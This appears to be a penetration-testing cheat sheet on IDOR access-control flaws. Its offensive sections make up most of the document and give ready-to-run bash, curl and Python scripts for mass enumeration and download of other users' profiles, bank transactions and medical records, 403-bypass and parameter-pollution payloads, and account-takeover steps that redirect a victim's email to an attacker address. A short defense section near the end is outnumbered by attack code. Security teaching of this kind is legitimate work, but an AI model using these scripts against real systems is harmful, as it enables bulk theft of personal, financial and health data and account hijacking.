# IDOR

## IDOR (Insecure Direct Object Reference)

### Overview

**IDOR (Insecure Direct Object Reference)** is an access control vulnerability that occurs when an application exposes direct references to internal implementation objects (files, database records, keys) without proper authorization checks. Attackers can manipulate these references to access unauthorized data.

**What makes it dangerous:**

* Often overlooked in testing
* Can lead to complete data breaches
* Easy to exploit (parameter manipulation)
* Difficult to detect with automated scanners
* Critical impact on confidentiality

**Common in:**

* API endpoints
* Download/upload functionality
* User profile management
* Document access systems
* Payment processing
* Administrative panels

**Impact:**

* Unauthorized data access
* Account takeover
* Privacy violations
* Financial loss
* Complete database enumeration

***

### Exploitation Workflow Summary

```
1. Identification & Discovery
   ├─ Locate object references (IDs, filenames)
   ├─ Map parameter types (numeric, UUID, encoded)
   ├─ Identify accessible resources
   └─ Document access patterns

2. Reference Analysis
   ├─ Determine ID format (sequential, random, hashed)
   ├─ Test encoding schemes (base64, MD5, custom)
   ├─ Extract reference patterns
   └─ Map ID relationships

3. Authorization Testing
   ├─ Test horizontal privilege escalation (same role)
   ├─ Test vertical privilege escalation (higher role)
   ├─ Bypass techniques (wildcards, arrays, null)
   └─ HTTP method manipulation

4. Systematic Enumeration
   ├─ Automated ID fuzzing
   ├─ Mass data extraction
   ├─ Pattern-based discovery
   └─ API version testing

5. Exploitation & Impact
   ├─ Data exfiltration
   ├─ Account takeover
   ├─ Privilege escalation
   └─ Business logic abuse
```

***

### Understanding IDOR

#### How IDOR Works

**Vulnerable application flow:**

```
1. User requests: GET /document?id=123
2. Server checks: Does document 123 exist?
3. Server responds: Returns document 123
4. Missing check: Is user authorized for document 123?
```

**Secure application flow:**

```
1. User requests: GET /document?id=123
2. Server checks: Does document 123 exist?
3. Server checks: Does current user own document 123?
4. Server responds: Returns document OR Access Denied
```

#### Common IDOR Patterns

**Direct numeric IDs:**

```
/user/profile?id=123
/document/view?doc_id=456
/order/details?order=789
```

**File references:**

```
/download?file=invoice_001.pdf
/media?filename=photo123.jpg
```

**Encoded references:**

```
/document?id=MTIz          (base64: 123)
/file?name=c81e728d...     (MD5 hash)
/user?uuid=550e8400-...    (UUID)
```

***

### Detection & Identification

#### Recognizing Vulnerable Parameters

**Common parameter names indicating IDOR:**

```
id=
uid=
user_id=
account_id=
customer_id=
order_id=
invoice_id=
doc_id=
file_id=
key=
reference=
number=
email=
username=
profile=
group=
```

**URL patterns to watch for:**

```
GET /api/user/123
GET /profile?uid=456
GET /document/view?id=789
GET /file/download?name=contract.pdf
POST /admin/delete?account=555
PUT /api/users/123/update
```

#### Testing for IDOR

**Step 1: Create two test accounts**

```
User A (Attacker): ID 100
User B (Victim):   ID 200
```

**Step 2: Access resource as User A**

```
GET /api/user/100/profile
Response: 200 OK (User A's data)
```

**Step 3: Try accessing User B's resource**

```
GET /api/user/200/profile
Response: 200 OK (User B's data) ← IDOR!
Expected: 403 Forbidden
```

**Step 4: Confirm exploitation**

```
- Can read User B's data
- Can modify User B's data
- Can delete User B's resources
```

***

### Basic IDOR Exploitation

#### Simple ID Manipulation

**Original request (your ID: 123):**

```http
GET /api/user/123/profile HTTP/1.1
Host: target.com
Cookie: session=abc123
```

**Modified request (victim's ID: 124):**

```http
GET /api/user/124/profile HTTP/1.1
Host: target.com
Cookie: session=abc123
```

**If vulnerable, response contains victim's data:**

```json
{
  "user_id": 124,
  "username": "victim",
  "email": "victim@example.com",
  "ssn": "123-45-6789"
}
```

#### Sequential ID Enumeration

**Bash script for mass enumeration:**

```bash
#!/bin/bash
# Enumerate user IDs 1-1000

for id in {1..1000}; do
    curl -s "https://target.com/api/user/$id" \
        -H "Cookie: session=YOUR_SESSION" \
        >> users.txt
    echo "Tested ID: $id"
done
```

**Python version:**

```python
import requests

session = requests.Session()
session.cookies.set('session', 'YOUR_SESSION')

for user_id in range(1, 1001):
    response = session.get(f'https://target.com/api/user/{user_id}')
    if response.status_code == 200:
        print(f"Found user: {user_id}")
        with open('users.txt', 'a') as f:
            f.write(response.text + '\n')
```

***

### Advanced IDOR Techniques

#### IDOR Beyond Simple IDs

**1. Multiple parameters (not just "id"):**

```
GET /api/resource?email=victim@example.com
GET /api/account?phone=555-1234
GET /api/profile?username=victim
GET /api/document?reference=DOC-2024-001
```

**2. Hidden in request body:**

```json
POST /api/update HTTP/1.1

{
  "user_id": 123,
  "email": "new@email.com"
}
```

**Change `user_id` to victim's ID:**

```json
{
  "user_id": 456,
  "email": "attacker@evil.com"
}
```

#### Double ID Parameter

**Bypass technique when single ID fails:**

**Original (blocked):**

```
GET /api/users/5200/info
Response: 403 Forbidden
```

**Bypass with double ID:**

```
GET /api/users/5200,5233/info
Response: 200 OK (both users' data)
```

**Why it works:**

* First ID (5200) is victim
* Second ID (5233) is yours
* Backend checks only second ID
* Returns data for both

#### Wildcard Injection

**Attempt to retrieve all records:**

```
GET /api/users/* HTTP/1.1
GET /api/users/% HTTP/1.1
GET /api/users/_ HTTP/1.1
GET /api/users/. HTTP/1.1
```

**Try plural forms:**

```
GET /api/users/* HTTP/1.1    (might work)
GET /api/user/* HTTP/1.1     (might fail)
```

**Why this matters:** Backend might:

* Return all records for wildcard
* Not properly sanitize special characters
* Process wildcards as database queries

***

### Encoded References

#### Base64 Encoding

**Identify base64:**

```
Filename: ZmlsZV8xMjMucGRm
```

**Decode:**

```bash
echo "ZmlsZV8xMjMucGRm" | base64 -d
# Output: file_123.pdf
```

**Exploitation:**

```bash
# Generate base64 for different files
for i in {1..100}; do
    echo -n "file_$i.pdf" | base64
done

# Test each encoded value
curl "https://target.com/download?file=ZmlsZV8xLnBkZg=="
curl "https://target.com/download?file=ZmlsZV8yLnBkZg=="
```

#### MD5 Hashing

**Identify MD5:**

```
?filename=c81e728d9d4c2f636f067f89cc14862c
```

**Pattern:** 32 hexadecimal characters

**Crack/predict MD5:**

```bash
# Generate MD5 for sequential files
for i in {1..100}; do
    echo -n "file_$i.pdf" | md5sum
done

# Results
c81e728d9d4c2f636f067f89cc14862c  file_1.pdf
eccbc87e4b5ce2fe28308fd9f2a7baf3  file_2.pdf
```

**Exploitation script:**

```bash
#!/bin/bash
for i in {1..100}; do
    hash=$(echo -n "file_$i.pdf" | md5sum | cut -d' ' -f1)
    curl -O "https://target.com/download?file=$hash"
done
```

#### Complex Encoding Chains

**Example: Base64 then MD5**

**JavaScript on client:**

```javascript
function downloadContract(uid) {
    var encoded = btoa(uid);           // Base64 encode
    var hashed = CryptoJS.MD5(encoded); // MD5 hash
    
    $.post("/download.php", {
        contract: hashed.toString()
    });
}
```

**Reverse engineering:**

```bash
# For ID=1:
echo -n "1" | base64              # Output: MQ==
echo -n "MQ==" | md5sum          # Output: cdd96d3cc73d1dbdaffa03cc6cd7339b

# Test
curl -X POST https://target.com/download.php \
    -d "contract=cdd96d3cc73d1dbdaffa03cc6cd7339b"
```

**Mass exploitation:**

```bash
#!/bin/bash
for i in {1..100}; do
    # Base64 encode, then MD5 hash
    hash=$(echo -n $i | base64 -w 0 | md5sum | tr -d ' -')
    curl -sOJ -X POST -d "contract=$hash" https://target.com/download.php
done
```

***

### UUID-Based IDORs

#### Understanding UUIDs

**UUID Version 1 (time-based):**

```
550e8400-e29b-41d4-a716-446655440000
```

**Predictable because:**

* Contains timestamp
* Contains MAC address
* Can be reconstructed if you know:
  * Creation time range
  * Server MAC address

#### Exploitation Strategies

**1. Extract UUIDs from public sources:**

```bash
# Wayback Machine
waybackurls target.com | grep -oP '[0-9a-f]{8}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{12}'

# VirusTotal, URLScan, etc.
# Check for exposed UUIDs in:
# - Error messages
# - API responses
# - JavaScript files
# - HTML comments
```

**2. UUID Version 1 prediction:**

If you can create multiple accounts and observe UUID patterns:

```
Account 1: 550e8400-e29b-41d4-a716-446655440000
Account 2: 550e8401-e29b-41d4-a716-446655440000
Account 3: 550e8402-e29b-41d4-a716-446655440000
```

Pattern: Sequential timestamps, predictable

**3. Change UUID type:**

```
Original: /api/user/a8ae-1322-ac09-8f90
Try:      /api/user/1
Try:      /api/user/user@company.com
```

***

### Bypass Techniques

#### 403 Forbidden Bypass

**Original (blocked):**

```
GET /api/users/5200/profile
Response: 403 Forbidden
```

**Bypass method 1: Path manipulation**

```
GET /api//users/5200/profile
GET /api\\users/5200/profile
GET /api/./users/5200/profile
GET /api/users/5200/profile/
GET /api/users/5200/profile?
GET /api/users/5200/profile.json
```

**Bypass method 2: Version fuzzing**

```
GET /api/v1/users/5200/profile  (blocked)
GET /api/v2/users/5200/profile  (might work)
GET /api/v3/users/5200/profile  (might work)
GET /api/users/5200/profile     (no version)
```

**Bypass method 3: Parameter pollution**

```
GET /api/v1/users/5200/profile&5233
GET /api/v1/users/5200&victimid=5233
```

**Bypass method 4: Header injection**

```http
GET /api/users/5200/profile HTTP/1.1
X-Original-URL: /api/users/5200/profile
X-Rewrite-URL: /api/users/5200/profile
```

#### HTTP Method Tampering

**Original GET (blocked):**

```http
GET /api/user/123 HTTP/1.1
Response: 403 Forbidden
```

**Try other methods:**

```http
POST /api/user/123 HTTP/1.1

PUT /api/user/123 HTTP/1.1

DELETE /api/user/123 HTTP/1.1

PATCH /api/user/123 HTTP/1.1

OPTIONS /api/user/123 HTTP/1.1
```

***

### API-Specific IDORs

#### RESTful API Pattern

**Standard REST endpoints:**

```
GET    /api/users/123        Read user 123
POST   /api/users            Create new user
PUT    /api/users/123        Update user 123
DELETE /api/users/123        Delete user 123
```

**IDOR test matrix:**

```
GET    /api/users/VICTIM_ID     Can you read?
PUT    /api/users/VICTIM_ID     Can you modify?
DELETE /api/users/VICTIM_ID     Can you delete?
```

#### Role-Based IDOR

**Add "admin" to path:**

```
Original: DELETE /identity/api/v2/user/videos/778
Response: "This is an admin function"

Modified: DELETE /identity/api/v2/admin/videos/778
Response: 200 OK (deletion successful)
```

**Why this works:**

* Path contains role designation
* Backend trusts path structure
* No actual role validation

#### Deprecated API Versions

**Current version (secure):**

```
GET /api/v3/users/123
Response: 403 Forbidden (proper authorization)
```

**Old version (vulnerable):**

```
GET /api/v1/users/123
Response: 200 OK (no authorization check)
```

**Test strategy:**

```bash
# Try all version numbers
for v in v1 v2 v3 v4 v5; do
    curl "https://target.com/api/$v/users/123"
done
```

#### Parameter Pollution

**Confuse the backend with duplicate parameters:**

**Original (blocked):**

```
GET /api/users?id=5200
Response: 403 Forbidden
```

**Polluted (bypassed):**

```
GET /api/users?id=5233&id=5200
# Backend might check first ID (yours)
# But return data for second ID (victim's)
```

#### JSON Parameter Manipulation

**Request body IDOR:**

```json
PUT /api/profile HTTP/1.1

{
  "user_id": 123,
  "email": "new@email.com",
  "role": "user"
}
```

**Modify to escalate:**

```json
{
  "user_id": 456,
  "email": "attacker@evil.com",
  "role": "admin"
}
```

***

### Mass Enumeration Strategies

#### Document Enumeration

**Predictable filenames:**

```
/documents/Invoice_1_09_2021.pdf
/documents/Report_1_10_2021.pdf
```

**Pattern:**

* Document type prefix
* Incremental ID
* Date suffix

**Exploitation:**

```bash
#!/bin/bash
for type in Invoice Report Contract; do
    for id in {1..100}; do
        for month in {01..12}; do
            url="https://target.com/documents/${type}_${id}_${month}_2021.pdf"
            curl -O "$url"
        done
    done
done
```

#### User ID Enumeration

**Extract document links for each user:**

```bash
#!/bin/bash
for uid in {1..1000}; do
    echo "Enumerating UID: $uid"
    curl -s "https://target.com/documents.php?uid=$uid" \
        | grep -oP "\/documents.*?\.pdf" \
        | while read file; do
            wget -q "https://target.com$file"
        done
done
```

#### POST Request Enumeration

**For POST-based APIs:**

```bash
#!/bin/bash
for uid in {1..100}; do
    echo "Testing UID: $uid"
    curl -s -X POST https://target.com/documents.php \
        --data "uid=$uid" \
        | awk -F "href='/documents/" '{for(i=2; i<=NF; i++){print $i}}' \
        | awk -F "'" '{print $1}' \
        | while read file; do
            wget -q "https://target.com/documents/$file"
        done
done
```

***

### Advanced IDOR Patterns

#### Second-Order IDOR

**What it is:** IDOR that triggers through indirect user actions, not direct parameter manipulation.

**Example scenario:**

```
1. Attacker uploads profile picture
2. In filename, includes victim's user ID: "profile_VICTIM_ID.jpg"
3. Backend processes upload
4. Backend associates picture with ID from filename
5. Victim's profile now shows attacker's image
```

**Another example:**

```
1. Change your email to victim@company.com
2. Request password reset
3. Reset link sent to victim's email
4. Attacker receives link (if email not verified)
```

#### JSON Globbing

**Exploit pattern matching in JSON:**

**Original:**

```json
GET /api/users/123
```

**Globbed:**

```json
GET /api/users/{123,456,789}
GET /api/users/*
```

**If backend processes glob patterns:**

```json
{
  "users": [
    {"id": 123, "data": "..."},
    {"id": 456, "data": "..."},
    {"id": 789, "data": "..."}
  ]
}
```

#### Static Keyword Exploitation

**APIs using keywords instead of IDs:**

**Original:**

```
GET /api/profile/me
Response: Your profile
```

**Test alternatives:**

```
GET /api/profile/admin
GET /api/profile/root
GET /api/profile/administrator
GET /api/profile/superuser
```

***

### Account Takeover via IDOR

#### Email Change Attack

**Step 1: Find email change endpoint**

```http
POST /api/user/update HTTP/1.1
Content-Type: application/json

{
  "user_id": 123,
  "email": "newemail@attacker.com"
}
```

**Step 2: Change victim's email**

```json
{
  "user_id": VICTIM_ID,
  "email": "attacker@evil.com"
}
```

**Step 3: Request password reset**

```
POST /forgot-password
email=attacker@evil.com
```

**Step 4: Reset link sent to attacker's email**

**Result:** Complete account takeover

#### Password Change Attack

**Direct password change:**

```http
POST /changepassword.php HTTP/1.1

userid=500&password=NewPass123
```

**Exploit:**

```
userid=VICTIM_ID&password=AttackerPass123
```

**If successful:**

* Victim's password changed
* Attacker can login as victim

***

### Real-World Examples

#### Example 1: Financial Application

**Scenario:** Banking app with transaction history

**Vulnerable endpoint:**

```
GET /api/transactions?account_id=1234567890
```

**Exploitation:**

```bash
# Enumerate account numbers
for account in {1000000000..1000001000}; do
    curl "https://bank.com/api/transactions?account_id=$account" \
        -H "Cookie: session=ATTACKER_SESSION"
done
```

**Impact:**

* Access to all customers' transaction history
* PII exposure (names, addresses, SSNs)
* Financial data theft

#### Example 2: Healthcare Portal

**Scenario:** Patient records system

**Vulnerable endpoint:**

```
GET /medical_records?patient_id=12345
```

**Exploitation:**

```python
import requests

session = requests.Session()
session.cookies.set('auth', 'ATTACKER_TOKEN')

for patient_id in range(10000, 20000):
    r = session.get(f'https://hospital.com/medical_records?patient_id={patient_id}')
    if r.status_code == 200:
        with open(f'patient_{patient_id}.json', 'w') as f:
            f.write(r.text)
```

**Impact:**

* HIPAA violation
* Complete medical history exposure
* Identity theft risk

#### Example 3: E-commerce Platform

**Scenario:** Order management system

**Vulnerable endpoint:**

```
GET /orders/view?order_id=ORD-2024-001
```

**Exploitation:**

```bash
# Sequential order numbers
for i in {1..1000}; do
    order_id=$(printf "ORD-2024-%03d" $i)
    curl "https://shop.com/orders/view?order_id=$order_id"
done
```

**Impact:**

* Customer PII (names, addresses, phones)
* Purchase history
* Payment information (partial card numbers)

***

### Defense & Prevention

**Secure coding practices:**

* Implement proper authorization checks
* Use indirect object references (map IDs to sessions)
* Validate user ownership before access
* Use UUIDs instead of sequential IDs
* Implement rate limiting
* Log and monitor access patterns
* Use access control lists (ACLs)

**Server-side validation:**

```python
# Bad - No authorization check
def get_user(user_id):
    return database.query("SELECT * FROM users WHERE id = ?", user_id)

# Good - Authorization check
def get_user(user_id, current_user_id):
    user = database.query("SELECT * FROM users WHERE id = ?", user_id)
    if user.id != current_user_id and not current_user.is_admin:
        raise UnauthorizedException()
    return user
```

**Detection techniques:**

* Monitor for sequential ID access patterns
* Alert on unusual access volume
* Track failed authorization attempts
* Analyze API endpoint usage patterns

***

### Quick Reference

#### Common IDOR Parameters

```
id=, uid=, user_id=, account_id=, customer_id=
order_id=, invoice_id=, doc_id=, file_id=
key=, reference=, number=, email=, username=
```

#### Quick Test Checklist

```
[ ] Change numeric IDs (+1, -1, 0, 999999)
[ ] Test with different user accounts
[ ] Try HTTP methods (GET, POST, PUT, DELETE)
[ ] Test encoded references (base64, MD5)
[ ] Add wildcards (*, %, ., _)
[ ] Try double parameters (id=123&id=456)
[ ] Test API versions (v1, v2, v3)
[ ] Manipulate JSON body parameters
[ ] Test with admin/root keywords
```

#### Enumeration Script Template

```bash
#!/bin/bash
for id in {1..1000}; do
    curl -s "https://target.com/api/resource/$id" \
        -H "Cookie: session=YOUR_SESSION" \
        -o "resource_$id.json"
    echo "Tested ID: $id"
done
```



